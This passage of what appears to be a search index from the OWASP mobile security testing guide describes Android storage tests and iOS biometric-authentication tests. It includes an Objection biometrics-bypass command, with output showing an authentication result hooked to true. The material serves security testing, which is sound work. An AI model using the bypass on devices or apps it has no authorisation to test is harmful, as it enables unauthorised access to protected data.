APIs","text":"","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0203/#overview","title":"Overview","text":"<p>On Android platforms, logging APIs like <code>Log</code>, <code>Logger</code>, <code>System.out.print</code>, <code>System.err.print</code>, and <code>java.lang.Throwable#printStackTrace</code> can inadvertently lead to the leakage of sensitive information. Log messages are recorded in logcat, a shared memory buffer, accessible since Android 4.1 (API level 16) only to privileged system applications that declare the <code>READ_LOGS</code> permission. Nonetheless, the vast ecosystem of Android devices includes pre-loaded apps with the <code>READ_LOGS</code> privilege, increasing the risk of sensitive data exposure. Therefore, direct logging to logcat is generally advised against due to its susceptibility to data leaks.</p>","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0203/#steps","title":"Steps","text":"<ol> <li>Install and run the app.</li> <li>Navigate to the screen of the mobile app you want to analyse the log output from.</li> <li>Execute a method trace ( Method Tracing) (using e.g.  Frida for Android) by attaching to the running app, targeting logging APIs and save the output.</li> </ol>","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0203/#observation","title":"Observation","text":"<p>The output should contain a list of locations where logging APIs are used in the app for the current execution.</p>","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0203/#evaluation","title":"Evaluation","text":"<p>The test case fails if you can find sensitive data being logged using those APIs.</p>","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0203/#mitigations","title":"Mitigations","text":"<ul> <li> Remove Logging Code</li> </ul>","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0203/#demos","title":"Demos","text":"<p> MASTG-DEMO-0006: Tracing Common Logging APIs Looking for Secrets </p>","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0207/","title":"MASTG-TEST-0207: Data Stored in the App Sandbox at Runtime","text":"","tags":["android","L2","test","MASWE-0006"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0207/#overview","title":"Overview","text":"<p>The goal of this test is to retrieve the files written to the internal storage and inspect them regardless of the APIs used to write them. It uses a simple approach based on file retrieval from the device storage ( Host-Device Data Transfer) before and after the app is exercised to identify the files created during the app's execution and to check if they contain sensitive data.</p>","tags":["android","L2","test","MASWE-0006"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0207/#steps","title":"Steps","text":"<ol> <li> <p>Start the device.</p> </li> <li> <p>Take a first copy of the app's private data directory ( Accessing App Data Directories) to have as a reference for offline analysis. You can use  adb for example.</p> </li> <li> <p>Launch and use the app going through the various workflows while inputting sensitive data wherever you can. Taking note of the data you input can help identify it later using tools to search for it.</p> </li> <li> <p>Take a second copy of the app's private data directory for offline analysis and make a diff using the first copy to identify all files created or modify during your testing session.</p> </li> </ol>","tags":["android","L2","test","MASWE-0006"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0207/#observation","title":"Observation","text":"<p>The output should contain a list of files that were created in the app's private storage during execution.</p>","tags":["android","L2","test","MASWE-0006"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0207/#evaluation","title":"Evaluation","text":"<p>Attempt to identify and decode data that has been encoded using methods such as base64 encoding, hexadecimal representation, URL encoding, escape sequences, wide characters and common data obfuscation methods such as xoring. Also consider identifying and decompressing compressed files such as tar or zip. These methods obscure but do not protect sensitive data.</p> <p>Search the extracted data for items such as keys, passwords and any sensitive data inputted into the app. The test case fails if you find any of this sensitive data.</p>","tags":["android","L2","test","MASWE-0006"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0207/#demos","title":"Demos","text":"<p> MASTG-DEMO-0010: File System Snapshots from Internal Storage </p>","tags":["android","L2","test","MASWE-0006"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0216/","title":"MASTG-TEST-0216: Sensitive Data Not Excluded From Backup","text":"","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0216/#overview","title":"Overview","text":"<p>This test verifies whether apps correctly instruct the system to exclude sensitive files from backups by performing a backup and restore of the app data and checking which files are restored.</p> <p>See  References to Backup Configurations Not Excluding Sensitive Data for a static analysis counterpart.</p> <p>Android provides a way to start the backup daemon to back up and restore app files, which you can use to verify which files are actually restored from the backup.</p>","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0216/#steps","title":"Steps","text":"<ol> <li>Start the device.</li> <li>Install an app on your device.</li> <li>Launch and use the app going through the various workflows while inputting sensitive data wherever you can.</li> <li>Perform a backup and restore of the app data ( Performing a Backup and Restore of App Data).</li> <li>Uninstall and reinstall the app but don't open it anymore.</li> <li>Restore the data from the backup and get the list of restored files.</li> </ol>","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0216/#observation","title":"Observation","text":"<p>The output should contain a list of files that are restored from the backup.</p>","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0216/#evaluation","title":"Evaluation","text":"<p>The test fails if any of the files are considered sensitive.</p>","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0216/#mitigations","title":"Mitigations","text":"<ul> <li> Exclude Sensitive Data from Backups</li> </ul>","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0216/#demos","title":"Demos","text":"<p> MASTG-DEMO-0035: Data Exclusion using backup_rules.xml with adb backup  MASTG-DEMO-0020: Data Exclusion using backup_rules.xml with Backup Manager </p>","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0231/","title":"MASTG-TEST-0231: References to Logging APIs","text":"","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0231/#overview","title":"Overview","text":"<p>This test verifies if an app uses logging APIs like <code>android.util.Log</code>, <code>Log</code>, <code>Logger</code>, <code>System.out.print</code>, <code>System.err.print</code>, and <code>java.lang.Throwable#printStackTrace</code>.</p>","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0231/#steps","title":"Steps","text":"<ol> <li>Use either  Static Analysis on Android with a tool such as  semgrep to identify all logging APIs.</li> </ol>","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0231/#observation","title":"Observation","text":"<p>The output should contain a list of locations where logging APIs are used.</p>","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0231/#evaluation","title":"Evaluation","text":"<p>The test fails if an app logs sensitive information from any of the listed locations.</p>","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0231/#mitigations","title":"Mitigations","text":"<ul> <li> Remove Logging Code</li> </ul>","tags":["android","L1","L2","P","test","MASWE-0001"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0262/","title":"MASTG-TEST-0262: References to Backup Configurations Not Excluding Sensitive Data","text":"","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0262/#overview","title":"Overview","text":"<p>This test verifies whether apps correctly instruct the system to exclude sensitive files from backups by analyzing the app's AndroidManifest.xml and backup rule configuration files.</p> <p>\"Android Backups\" can be implemented via Auto Backup (Android 6.0 (API level 23) and higher) and Key-value backup (Android 2.2 (API level 8) and higher). Auto Backup is the recommended approach by Android as it is enabled by default and requires no work to implement.</p> <p>To exclude specific files when using Auto Backup, developers must explicitly define exclusion rules in the <code>exclude</code> tag in:</p> <ul> <li><code>data_extraction_rules.xml</code> (for Android 12 and higher using <code>android:dataExtractionRules</code>)</li> <li><code>backup_rules.xml</code> (for Android 11 or lower using <code>android:fullBackupContent</code>)</li> </ul> <p>The <code>cloud-backup</code> and <code>device-transfer</code> parameters can be used to exclude files from cloud backups and device-to-device transfers, respectively.</p> <p>The key-value backup approach requires developers to set up a <code>BackupAgent</code> or <code>BackupAgentHelper</code> and specify what data should be backed up.</p> <p>Regardless of which approach the app used, Android provides a way to start the backup daemon to back up and restore app files. You can use this daemon for testing purposes and initiate the backup process and restore the app's data, allowing you to verify which files were restored from the backup.</p>","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0262/#steps","title":"Steps","text":"<ol> <li>Obtain the <code>AndroidManifest.xml</code> file using  Obtaining Information from the AndroidManifest.</li> <li>Search for the <code>allowBackup</code> flag in the <code>AndroidManifest.xml</code>.</li> <li>Search for the <code>fullBackupContent</code> attribute (for Android 11 or lower) or the <code>dataExtractionRules</code> attribute (for Android 12 and higher) in the <code>AndroidManifest.xml</code>.</li> <li>Retrieve the <code>backup_rules.xml</code> or <code>data_extraction_rules.xml</code> file.</li> </ol>","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0262/#observation","title":"Observation","text":"<p>The output should explicitly show:</p> <ul> <li>whether the <code>allowBackup</code> flag is set to <code>true</code> or <code>false</code>. If the flag is not specified, it is treated as <code>true</code> by default.</li> <li>whether the <code>fullBackupContent</code> and/or <code>dataExtractionRules</code> attributes are present in the <code>AndroidManifest.xml</code>.</li> <li>the contents of the <code>backup_rules.xml</code> or <code>data_extraction_rules.xml</code> file, if present.</li> </ul>","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0262/#evaluation","title":"Evaluation","text":"<p>The test fails if the app allows sensitive data to be backed up. Specifically, if the following conditions are met:</p> <ul> <li><code>android:allowBackup=\"true\"</code> in the <code>AndroidManifest.xml</code></li> <li><code>android:fullBackupContent=\"@xml/backup_rules\"</code> isn't declared in the <code>AndroidManifest.xml</code> (for Android 11 or lower)</li> <li><code>android:dataExtractionRules=\"@xml/data_extraction_rules\"</code> isn't declared in the <code>AndroidManifest.xml</code> (for Android 12 and higher)</li> <li><code>backup_rules.xml</code> or <code>data_extraction_rules.xml</code> aren't present or don't exclude all sensitive files.</li> </ul>","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0262/#mitigations","title":"Mitigations","text":"<ul> <li> Exclude Sensitive Data from Backups</li> </ul>","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0262/#demos","title":"Demos","text":"<p> MASTG-DEMO-0034: Backup and Restore App Data with semgrep </p>","tags":["android","L1","L2","P","test","MASWE-0004"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0287/","title":"MASTG-TEST-0287: Sensitive Data Stored Unencrypted via the SharedPreferences API to the App Sandbox","text":"<p>Placeholder MASTG-TEST</p> <p>This test hasn't been created yet and it's a placeholder. But you can check its status or start working on it yourself. If the issue has not yet been assigned, you can request to be assigned to it and submit a PR with the new content for that test by following our guidelines.</p> <p> Check our GitHub Issues for MASTG-TEST-0287</p> <p>If an issue doesn't exist yet, please create one and assign it to yourself or request to be assigned to it.</p>","tags":["android","L1","L2","test","placeholder","MASWE-0006"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0287/#draft-description","title":"Draft Description","text":"<p>This test checks if the app is using the SharedPreferences API to store sensitive data (e.g. user credentials, tokens) in an unencrypted format within the app's sandbox. This includes checking for the use of <code>SharedPreferences</code> without encryption as well as not using <code>EncryptedSharedPreferences</code> or similar secure storage mechanisms.</p> <p>For more details, check the associated weakness:  Sensitive Data Stored Unencrypted in Private Storage Locations</p>","tags":["android","L1","L2","test","placeholder","MASWE-0006"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0287/#demos","title":"Demos","text":"<p> MASTG-DEMO-0060: App Writing Sensitive Data to Sandbox using EncryptedSharedPreferences </p>","tags":["android","L1","L2","test","placeholder","MASWE-0006"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064/","title":"MASTG-TEST-0064: Testing Biometric Authentication","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> References to APIs for Event-Bound Biometric Authentication</li> <li> Runtime Use Of Event-Bound Biometric Authentication</li> <li> References to APIs Allowing Fallback to Non-Biometric Authentication</li> <li> Runtime Use Of APIs Allowing Fallback to Non-Biometric Authentication</li> <li> References to APIs Detecting Biometric Enrollment Changes</li> <li> Runtime Use Of APIs Detecting Biometric Enrollment Changes</li> </ul>","tags":["ios","L2","test","MSTG-AUTH-8","MSTG-STORAGE-11","masvs-auth-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064/#overview","title":"Overview","text":"<p>The usage of frameworks in an app can be detected by analyzing the app binary's list of shared dynamic libraries. This can be done by using  otool:</p> <pre><code>otool -L &lt;AppName&gt;.app/&lt;AppName&gt;\n</code></pre> <p>If <code>LocalAuthentication.framework</code> is used in an app, the output will contain both of the following lines (remember that <code>LocalAuthentication.framework</code> uses <code>Security.framework</code> under the hood):</p> <pre><code>/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication\n/System/Library/Frameworks/Security.framework/Security\n</code></pre> <p>If <code>Security.framework</code> is used, only the second one will be shown.</p>","tags":["ios","L2","test","MSTG-AUTH-8","MSTG-STORAGE-11","masvs-auth-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064/#static-analysis","title":"Static Analysis","text":"<p>It is important to remember that the LocalAuthentication framework is an event-based procedure and as such, should not be the sole method of authentication. Though this type of authentication is effective on the user-interface level, it is easily bypassed through patching or instrumentation. Therefore, it is best to use the keychain service method, which means you should:</p> <ul> <li>Verify that sensitive processes, such as re-authenticating a user performing a payment transaction, are protected using the keychain services method.</li> <li>Verify that access control flags are set for the keychain item which ensure that the data of the keychain item can only be unlocked by means of authenticating the user. This can be done with one of the following flags:<ul> <li><code>kSecAccessControlBiometryCurrentSet</code> (before iOS 11.3 <code>kSecAccessControlTouchIDCurrentSet</code>). This will make sure that a user needs to authenticate with biometrics (e.g. Face ID or Touch ID) before accessing the data in the keychain item. Whenever the user adds a fingerprint or facial representation to the device, it will automatically invalidate the entry in the Keychain. This makes sure that the keychain item can only ever be unlocked by users that were enrolled when the item was added to the keychain.</li> <li><code>kSecAccessControlBiometryAny</code> (before iOS 11.3 <code>kSecAccessControlTouchIDAny</code>). This will make sure that a user needs to authenticate with biometrics (e.g. Face ID or Touch ID) before accessing the data in the Keychain entry. The Keychain entry will survive any (re-)enroling of new fingerprints or facial representation. This can be very convenient if the user has a changing fingerprint. However, it also means that attackers, who are somehow able to enrole their fingerprints or facial representations to the device, can now access those entries as well.</li> <li><code>kSecAccessControlUserPresence</code> can be used as an alternative. This will allow the user to authenticate through a passcode if the biometric authentication no longer works. This is considered to be weaker than <code>kSecAccessControlBiometryAny</code> since it is much easier to steal someone's passcode entry by means of shouldersurfing, than it is to bypass the Touch ID or Face ID service.</li> </ul> </li> <li>In order to make sure that biometrics can be used, verify that the <code>kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly</code> or the <code>kSecAttrAccessibleWhenPasscodeSet</code> protection class is set when the <code>SecAccessControlCreateWithFlags</code> method is called. Note that the <code>...ThisDeviceOnly</code> variant will make sure that the keychain item is not synchronized with other iOS devices.</li> </ul> <p>Note, a data protection class specifies the access methodology used to secure the data. Each class uses different policies to determine when the data is accessible.</p>","tags":["ios","L2","test","MSTG-AUTH-8","MSTG-STORAGE-11","masvs-auth-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Objection Biometrics Bypass can be used to bypass LocalAuthentication. Objection uses Frida to instrument the <code>evaluatePolicy</code> function so that it returns <code>True</code> even if authentication was not successfully performed. Use the <code>ios ui biometrics_bypass</code> command to bypass the insecure biometric authentication. Objection will register a job, which will replace the <code>evaluatePolicy</code> result. It will work in both, Swift and Objective-C implementations.</p> <pre><code>...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass\n(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable\n...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself\n(agent) [3mhtws9x47q] OS authentication response: false\n(agent) [3mhtws9x47q] Marking OS response as True instead\n(agent) [3mhtws9x47q] Biometrics bypass hook complete\n</code></pre> <p>If vulnerable, the module will automatically bypass the login form.</p>","tags":["ios","L2","test","MSTG-AUTH-8","MSTG-STORAGE-11","masvs-auth-2","deprecated"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0266/","title":"MASTG-TEST-0266: References to APIs for Event-Bound Biometric Authentication","text":"","tags":["ios","L2","test","MASWE-0044"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0266/#overview","title":"Overview","text":"<p>This test checks if the app insecurely accesses sensitive resources that should be protected by user authentication (e.g., tokens, keys) relying solely** on the LocalAuthentication API for access control instead of using the Keychain API and requiring user presence.</p> <p>The LocalAuthentication API (e.g., <code>LAContext</code>) provides user authentication (Touch ID, Face ID, device passcode), returning only a success or failure result. However, it does not securely store secrets or enforce any security. This makes it susceptible to logic manipulation (e.g., bypassing an <code>if authenticated { ... }</code> check).</p> <p>In contrast, the Keychain API securely stores sensitive data, and can be configured with access control policies (e.g., require user presence such as biometrics) via <code>kSecAccessControl</code> flags. This ensures authentication is not just a one-time boolean, but part of a secure data retrieval path (out-of-process), so bypassing authentication becomes significantly harder.</p>","tags":["ios","L2","test","MASWE-0044"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0266/#steps","title":"Steps","text":"<ol> <li>Run a static analysis scan with  radare2 for iOS to detect usage of <code>LAContext.evaluatePolicy</code></li> <li>Run a static analysis scan with  radare2 for iOS to detect usage of Keychain APIs, especially <code>SecAccessControlCreateWithFlags</code> (which should go accompanied by other APIs such as <code>SecItemAdd</code> and <code>SecItemCopyMatching</code>).</li> </ol>","tags":["ios","L2","test","MASWE-0044"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0266/#observation","title":"Observation","text":"<p>The analysis should output the locations where the <code>LAContext.evaluatePolicy</code> and Keychain APIs are used in the codebase (or the lack of their use).</p>","tags":["ios","L2","test","MASWE-0044"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0266/#evaluation","title":"Evaluation","text":"<p>The test fails if for each sensitive data resource worth protecting:</p> <ul> <li><code>LAContext.evaluatePolicy</code> is used explicitly.</li> <li>There are no calls to <code>SecAccessControlCreateWithFlags</code> requiring user presence with any of the possible flags.</li> </ul>","tags":["ios","L2","test","MASWE-0044"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0266/#demos","title":"Demos","text":"<p> MASTG-DEMO-0041: Uses of LAContext.evaluatePolicy with r2  MASTG-DEMO-0047: Runtime Use of the Keychain Not Requiring User Presence with Frida </p>","tags":["ios","L2","test","MASWE-0044"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0267/","title":"MASTG-TEST-0267: Runtime Use Of Event-Bound Biometric Authentication","text":"","tags":["ios","L2","test","MASWE-0044"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0267/#overview","title":"Overview","text":"<p>This test is the dynamic counterpart to  References to APIs for Event-Bound Biometric Authentication.</p>","tags":["ios","L2","test","MASWE-0044"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0267/#steps","title":"Steps","text":"<ol> <li>Use runtime method hooking (see  Method Hooking) and look for uses of LAContext.evaluatePolicy(...) and <code>SecAccessControlCreateWithFlags</code>, including all flags.</li> </ol>","tags":["ios","L2","test","MASWE-0044"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0267/#observation","title":"Observation","text":"<p>The output should contain a list of locations where the <code>LAContext.evaluatePolicy</code> and <code>SecAccessControlCreateWithFlags</code> functions are called including all used flags.</p>","tags":["ios","L2","test","MASWE-0044"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0267/#evaluation","title":"Evaluation","text":"<p>The test fails if for each sensitive data resource worth protecting:</p> <ul> <li><code>LAContext.evaluatePolicy</code> is used explicitly.</li> <li>There are no calls to <code>SecAccessControlCreateWithFlags</code> requiring user presence with any of the possible flags.</li> </ul>","tags":["ios","L2","test","MASWE-0044"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0267/#demos","title":"Demos","text":"<p> MASTG-DEMO-0042: Runtime Use of LAContext.evaluatePolicy with Frida </p>","tags":["ios","L2","test","MASWE-0044"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0268/","title":"MASTG-TEST-0268: References to APIs Allowing Fallback to Non-Biometric Authentication","text":"","tags":["ios","L2","test","MASWE-0045"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0268/#overview","title":"Overview","text":"<p>This test checks if the app uses authentication mechanisms that rely on the user's passcode instead of biometrics or allow fallback to device passcode when biometric authentication fails. Specifically, it checks for use of <code>kSecAccessControlDevicePasscode</code> or <code>kSecAccessControlUserPresence</code>.</p> <p>The <code>kSecAccessControlUserPresence</code> flag is described in the Apple docs as the option that's typically used as it \"lets the system choose a mechanism, depending on the current situation\". However, this allows fallback to passcode in some cases (e.g. when biometrics aren't configured yet), which is considered weaker than requiring biometrics alone because passcodes are more susceptible to compromise (e.g., through shoulder surfing).</p> <p>Note: This test does not consider <code>LAPolicy.deviceOwnerAuthentication</code> for LocalAuthentication flows because that shouldn't be used on its own. See  References to APIs for Event-Bound Biometric Authentication.</p>","tags":["ios","L2","test","MASWE-0045"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0268/#steps","title":"Steps","text":"<ol> <li>Run a static analysis scan using  radare2 for iOS to detect usage of <code>SecAccessControlCreateWithFlags</code> with the <code>kSecAccessControlUserPresence</code> or <code>kSecAccessControlDevicePasscode</code> flags.</li> </ol>","tags":["ios","L2","test","MASWE-0045"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0268/#observation","title":"Observation","text":"<p>The output should contain a list of locations where relevant APIs are used.</p>","tags":["ios","L2","test","MASWE-0045"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0268/#evaluation","title":"Evaluation","text":"<p>The test fails if the app uses <code>SecAccessControlCreateWithFlags</code> with the <code>kSecAccessControlUserPresence</code> or <code>kSecAccessControlDevicePasscode</code> flags for any sensitive data resource that needs protection.</p> <p>The test passes only if the app uses <code>SecAccessControlCreateWithFlags</code> with stricter flags, such as <code>kSecAccessControlBiometryAny</code>, <code>kSecAccessControlBiometryCurrentSet</code> to enforce biometric-only access for any sensitive data resource that needs protection (being <code>kSecAccessControlBiometryCurrentSet</code> the one considered the most secure).</p> <p>Note: Using <code>kSecAccessControlUserPresence</code> or <code>kSecAccessControlDevicePasscode</code> is not inherently a vulnerability, but in high-security applications (e.g., finance, government, health), their use can represent a weakness or misconfiguration that reduces the intended security posture. So this issue better categorized as a security weakness or hardening issue, not a critical vulnerability.</p>","tags":["ios","L2","test","MASWE-0045"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0268/#demos","title":"Demos","text":"<p> MASTG-DEMO-0043: Uses of kSecAccessControlUserPresence with r2 </p>","tags":["ios","L2","test","MASWE-0045"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0269/","title":"MASTG-TEST-0269: Runtime Use Of APIs Allowing Fallback to Non-Biometric Authentication","text":"","tags":["ios","L2","test","MASWE-0045"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0269/#overview","title":"Overview","text":"<p>This test is the dynamic counterpart to  References to APIs Allowing Fallback to Non-Biometric Authentication.</p>","tags":["ios","L2","test","MASWE-0045"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0269/#steps","title":"Steps","text":"<ol> <li>Use runtime method hooking (see  Method Hooking) and look for uses of <code>SecAccessControlCreateWithFlags</code> and specific flags.</li> </ol>","tags":["ios","L2","test","MASWE-0045"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0269/#observation","title":"Observation","text":"<p>The output should contain a list of locations where the <code>SecAccessControlCreateWithFlags</code> function is called including all used flags.</p>","tags":["ios","L2","test","MASWE-0045"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0269/#evaluation","title":"Evaluation","text":"<p>The test fails if the app uses <code>SecAccessControlCreateWithFlags</code> with the <code>kSecAccessControlUserPresence</code> or <code>kSecAccessControlDevicePasscode</code> flags for any sensitive data resource that needs protection.</p> <p>The test passes only if the app uses <code>SecAccessControlCreateWithFlags</code> with stricter flags, such as <code>kSecAccessControlBiometryAny</code>, <code>kSecAccessControlBiometryCurrentSet</code> to enforce biometric-only access for any sensitive data resource that needs protection (being <code>kSecAccessControlBiometryCurrentSet</code> the one considered the most secure).</p>","tags":["ios","L2","test","MASWE-0045"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0269/#demos","title":"Demos","text":"<p> MASTG-DEMO-0044: Runtime Use of kSecAccessControlUserPresence with Frida </p>","tags":["ios","L2","test","MASWE-0045"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0270/","title":"MASTG-TEST-0270: References to APIs Detecting Biometric Enrollment Changes","text":"","tags":["ios","L2","test","MASWE-0046"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0270/#overview","title":"Overview","text":"<p>This test checks whether the app fails to protect sensitive operations against unauthorized access following biometric enrollment changes. An attacker who obtains the device passcode could add a new fingerprint or facial representation via system settings and use it to authenticate in the app.</p> <p>The test identifies the absence of the <code>kSecAccessControlBiometryCurrentSet</code> access control flag when storing sensitive items in the Keychain via <code>SecAccessControlCreateWithFlags</code>. This flag ensures that the associated Keychain item becomes inaccessible if the biometric database changes (e.g., when a new fingerprint or face is added). As a result, only users whose biometric data was enrolled at the time the item was created can unlock it, preventing unauthorized access through later-enrolled biometrics.</p>","tags":["ios","L2","test","MASWE-0046"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0270/#steps","title":"Steps","text":"<ol> <li>Run a static analysis tool such as  radare2 for iOS on the app binary and look for uses of <code>SecAccessControlCreateWithFlags</code> API with <code>kSecAccessControlBiometryCurrentSet</code> flag.</li> </ol>","tags":["ios","L2","test","MASWE-0046"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0270/#observation","title":"Observation","text":"<p>The output should contain a list of locations where relevant APIs are used.</p>","tags":["ios","L2","test","MASWE-0046"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0270/#evaluation","title":"Evaluation","text":"<p>The test fails if the app uses <code>SecAccessControlCreateWithFlags</code> with any flag except the <code>kSecAccessControlBiometryCurrentSet</code> flag for any sensitive data resource worth protecting.</p>","tags":["ios","L2","test","MASWE-0046"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0270/#demos","title":"Demos","text":"<p> MASTG-DEMO-0045: Uses of kSecAccessControlBiometryCurrentSet with r2 </p>","tags":["ios","L2","test","MASWE-0046"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0271/","title":"MASTG-TEST-0271: Runtime Use Of APIs Detecting Biometric Enrollment Changes","text":"","tags":["ios","L2","test","MASWE-0046"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0271/#overview","title":"Overview","text":"<p>This test is the dynamic counterpart to  References to APIs Detecting Biometric Enrollment Changes.</p>","tags":["ios","L2","test","MASWE-0046"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0271/#steps","title":"Steps","text":"<ol> <li>Use runtime method hooking (see  Method Hooking) and look for uses of <code>SecAccessControlCreateWithFlags</code> and specific flags.</li> </ol>","tags":["ios","L2","test","MASWE-0046"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0271/#observation","title":"Observation","text":"<p>The output should contain a list of locations where the <code>SecAccessControlCreateWithFlags</code> function is called including all used flags.</p>","tags":["ios","L2","test","MASWE-0046"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0271/#evaluation","title":"Evaluation","text":"<p>The test fails if the app uses <code>SecAccessControlCreateWithFlags</code> with any flag except the <code>kSecAccessControlBiometryCurrentSet</code> flag for any sensitive data resource worth protecting.</p>","tags":["ios","L2","test","MASWE-0046"]},{"location":"MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0271/#demos","title":"Demos","text":"<p> MASTG-DEMO-0046: Runtime Use of kSecAccessControlBiometryCurrentSet with Frida 